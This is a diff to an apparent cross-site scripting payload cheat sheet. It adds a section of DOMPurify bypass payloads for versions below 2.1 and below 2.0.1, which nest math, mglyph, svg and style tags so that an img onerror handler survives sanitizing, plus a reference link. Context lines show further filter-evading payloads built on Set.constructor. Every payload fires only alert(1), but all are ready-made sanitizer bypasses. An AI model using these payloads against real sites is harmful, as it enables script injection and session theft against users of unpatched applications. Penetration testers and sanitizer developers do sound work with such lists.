@@ -122,6 +122,23 @@ Set.constructor('ale'+'rt(13)')();
 Set.constructor`al\x65rt\x2814\x29```;
 ```
 
+## DOMPurify 
+
+### <2.1
+```js
+<math><mtext><table><mglyph><style><!--</style><img title="--&gt;&lt;/mglyph&gt;&lt;img&Tab;src=1&Tab;onerror=alert(1)&gt;">
+
+<math><mtext><table><mglyph><style><![CDATA[</style><img title="]]&gt;&lt;/mglyph&gt;&lt;img&Tab;src=1&Tab;onerror=alert(1)&gt;">
+
+<math><mtext><table><mglyph><style><!--</style><img title=&quot;--></mglyph><img	src=1	onerror=alert(1)>">
+```
+### <2.0.1
+```js
+<svg></p><style><a id="</style><img src=1 onerror=alert(1)>">
+
+<svg><p><style><a id="</style><img src=1 onerror=alert(1)>"></p></svg>
+```
+
 ## Events
 ```js
 onafterprint
@@ -385,4 +402,5 @@ xmp
 
 - https://portswigger.net/web-security/cross-site-scripting/cheat-sheet
 - https://gist.github.com/xsuperbug/1aff5c1d5ddbfefb035f33dd9c8e8a72
+- https://netsec.expert/posts/xss-in-2021/#double-encoding
 
